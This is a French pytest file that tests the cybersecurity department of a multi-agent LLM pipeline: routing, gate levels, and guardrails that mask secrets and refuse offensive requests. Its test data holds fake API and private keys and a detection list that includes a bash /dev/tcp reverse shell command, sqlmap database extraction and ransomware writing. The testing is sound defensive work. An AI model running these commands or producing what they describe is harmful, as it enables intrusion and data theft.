"""Département CYBER-FORTRESS : agents, routage, GATE, plancher F3, garde-fous secrets / offensif."""
import json

import pytest
from sqlalchemy import select

from app import agents as reg
from app import cyber, gate, ledger, pipeline, projets
from app.db import session_scope
from app.llm import FournisseurFactice
from app.models import Etape, Mission

from .conftest import creer_mission, lire_mission

SERVICES = ["CYBER-FORTRESS/audit", "CYBER-FORTRESS/veille", "CYBER-FORTRESS/conformite",
            "CYBER-FORTRESS/incident"]
# Secrets factices construits à l'exécution (aucune valeur réelle dans le dépôt).
CLE_API = "sk-" + "a1B2c3D4e5F6g7H8i9J0" * 2
CLE_PRIVEE = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----"
PROPRE = "BROUILLON — à valider\n## Constats\n- Gravité haute : port SSH exposé — correction : limiter l'accès."


def test_93_agents_et_departement():
    tous = reg.charger()
    assert len(tous) == 93
    s = reg.services()
    for srv in SERVICES:
        assert {"collector", "analyst", "checker", "executor"} <= set(s[srv]), srv
        assert s[srv]["directeur"] == "DIR-TECH"
    cyber_agents = [a for a in tous.values() if a["service"].startswith("CYBER-FORTRESS/")]
    assert len(cyber_agents) == 16 and {a["departement"] for a in cyber_agents} == {"Cybersécurité"}
    assert "CYBER-FORTRESS/incident" in tous["DIR-TECH"]["consignes"]


def test_consignes_defensives():
    for srv in SERVICES:
        p = srv.replace("/", "-").upper()
        analyst = reg.agent(f"{p}-ANALYST")["consignes"]
        assert "strictement DÉFENSIVE" in analyst and "Jamais de code d'exploitation" in analyst
        assert "<SECRET>" in analyst and "référence à vérifier" in analyst and "tu n'exécutes rien" in analyst
        checker = reg.agent(f"{p}-CHECKER")["consignes"]
        assert '"ok": false' in checker and "secret" in checker and "action offensive" in checker
        assert "AUCUNE action externe" in reg.agent(f"{p}-EXECUTOR")["consignes"]


def _service(titre, consigne):
    mid = creer_mission(titre=titre, consigne=consigne)
    with session_scope() as s:
        ctx = pipeline.Contexte(s.get(Mission, mid))
    return pipeline.choisir_service(ctx)


@pytest.mark.parametrize("titre,consigne,attendu", [
    ("Durcissement", "Audit de sécurité de la configuration SSH, du pare-feu et de fail2ban (OWASP, ANSSI)",
     "CYBER-FORTRESS/audit"),
    ("Veille", "Quelles CVE et vulnérabilités récentes touchent Caddy et n8n ?", "CYBER-FORTRESS/veille"),
    ("Obligations", "NIS2 s'applique-t-elle ? Politique de mots de passe, sauvegardes 3-2-1 et PRA",
     "CYBER-FORTRESS/conformite"),
    ("Alerte", "Incident de sécurité : suspicion de piratage après un phishing", "CYBER-FORTRESS/incident"),
])
def test_routage_cyber(titre, consigne, attendu):
    assert _service(titre, consigne) == attendu


def test_routage_existant_intact():
    assert _service("Conformité", "Vérifie la CONFORMITÉ RGPD") == "LEX-GUARD/conformite"
    assert _service("RGPD", "Point RGPD sur le formulaire") == "LEX-GUARD/conformite"
    assert _service("Revue", "Relis ce code PYTHON") == "CODE-CORE/revue"
    assert _service("Jeux", "Quelles règles de l'ANJ pour un site de poker ?") == "LEX-GUARD/droit-france"


# --- GATE ---------------------------------------------------------------------------

@pytest.mark.parametrize("srv", SERVICES)
def test_gate_cyber_n2_minimum(srv):
    assert gate.classer("Note", "Fais une synthèse des bonnes pratiques", service=srv)[0] == "N2"
    assert gate.classer("Note", "Synthèse", service=srv, niveau_llm="N0",
                        livrable="Bonnes pratiques générales")[0] == "N2"


@pytest.mark.parametrize("livrable", [
    "Recommandation : ajouter une règle au pare-feu UFW", "Désactiver le compte inutilisé",
    "Procéder à la rotation des clés SSH", "Redémarrer le service Caddy", "Ouverture du port 8443",
    "Notifier la CNIL sous 72 h",
])
def test_gate_cyber_n3_action_production_ou_notification(livrable):
    niveau, motif = gate.classer("Audit", "Analyse la configuration", service="CYBER-FORTRESS/audit",
                                 livrable=livrable)
    assert niveau == "N3", livrable
    assert "cybersécurité" in motif


# --- Plancher F3 ----------------------------------------------------------------------

def test_plancher_f3_cyber():
    mid = creer_mission(titre="Veille", consigne="Liste les CVE fournies", service="CYBER-FORTRESS/veille",
                        fonctionnement="F1")
    pipeline.traiter(mid)
    m = lire_mission(mid)
    assert m.fonctionnement == "F3" and "service CYBER-FORTRESS/veille" in m.fonctionnement_raison


# --- Garde-fous (LLM factice) ---------------------------------------------------------

def test_detection_et_masquage():
    texte = f"Clé : {CLE_API}\n{CLE_PRIVEE}\nmot de passe = Tr0ub4dor&3xyz\nTOKEN=<A_COMPLETER> api_key: ${{CLE}}"
    assert {"clé d'API", "clé privée", "mot de passe ou jeton en clair"} <= set(cyber.detecter_secrets(texte))
    masque = cyber.masquer(texte)
    assert CLE_API not in masque and "PRIVATE KEY" not in masque and "Tr0ub4dor" not in masque
    assert "<A_COMPLETER>" in masque and "${CLE}" in masque  # gabarits conservés
    assert cyber.detecter_secrets("mot de passe : <SECRET>  ·  token=xxxxxxxx") == []


def test_texte_defensif_non_bloque():
    defensif = ("Se protéger contre les rançongiciels et le phishing ; Docker contourne UFW : publier les ports "
                "sur 127.0.0.1 ; surveiller les tentatives de force brute avec fail2ban.")
    assert cyber.detecter_offensif(defensif) == [] and cyber.detecter_secrets(defensif) == []
    assert cyber.verdict_garde_fou(defensif) is None


@pytest.mark.parametrize("offensif", [
    "Ouvrir un reverse shell avec bash -i vers /dev/tcp/1.2.3.4/4444",
    "Utiliser sqlmap pour extraire la base du site concurrent",
    "Contourner l'authentification du panneau d'administration",
    "Écrire un ransomware de démonstration",
])
def test_detection_offensive(offensif):
    assert cyber.detecter_offensif(offensif)


@pytest.mark.parametrize("mauvais", [f"{PROPRE}\nJeton : {CLE_API}", f"{PROPRE}\n{CLE_PRIVEE}",
                                     f"{PROPRE}\nÉtape 2 : lancer un reverse shell pour tester"])
def test_checker_refuse_secret_ou_offensif_puis_correction(mauvais):
    # Le CHECKER factice accepterait tout : le refus vient du garde-fou déterministe.
    FournisseurFactice.script["analyst"].extend([mauvais, PROPRE])
    mid = creer_mission(titre="Audit", consigne="Audit de la configuration SSH", service="CYBER-FORTRESS/audit",
                        fonctionnement="F3")
    pipeline.traiter(mid)
    m = lire_mission(mid)
    assert m.revisions == 1 and FournisseurFactice.appels.count("analyst") == 2
    correction = [e for r, e in FournisseurFactice.entrees if r == "analyst"][1]
    assert CLE_API not in correction and "PRIVATE KEY" not in correction  # secret jamais renvoyé au modèle
    assert "Secret présent" in correction or "Action offensive" in correction
    with session_scope() as s:
        etapes = s.execute(select(Etape).where(Etape.mission_id == mid)).scalars().all()
        refus = [e for e in etapes if e.entree == "garde-fou cybersécurité"]
        assert len(refus) == 1 and refus[0].verdict == "refus"
        assert all(CLE_API not in (e.sortie or "") and "PRIVATE KEY-----\nb3" not in (e.sortie or "")
                   for e in etapes)
    assert CLE_API not in (m.livrable_texte or "")
    assert any(e["details"].get("source") == "garde_fou_cyber" for e in ledger.lister(200))


def test_secret_persistant_jamais_stocke():
    # 3 livrables avec secret en F3 : escalade, et le livrable conservé est masqué.
    FournisseurFactice.script["analyst"].extend([f"{PROPRE}\n{CLE_API}"] * 3)
    mid = creer_mission(titre="Incident", consigne="Plan de réponse", service="CYBER-FORTRESS/incident",
                        fonctionnement="F3")
    pipeline.traiter(mid)
    m = lire_mission(mid)
    assert m.statut == "a_reformuler" and CLE_API not in m.livrable_texte and cyber.MASQUE in m.livrable_texte


def test_projets_services_cyber():
    reg_p = projets.charger(recharger=True)
    for code in ("nexus", "paradoxx"):
        assert {"CYBER-FORTRESS/audit", "CYBER-FORTRESS/veille"} <= set(reg_p[code]["services"])
    for code in ("poker-winners", "freelance-ia"):
        assert "CYBER-FORTRESS/audit" in reg_p[code]["services"]
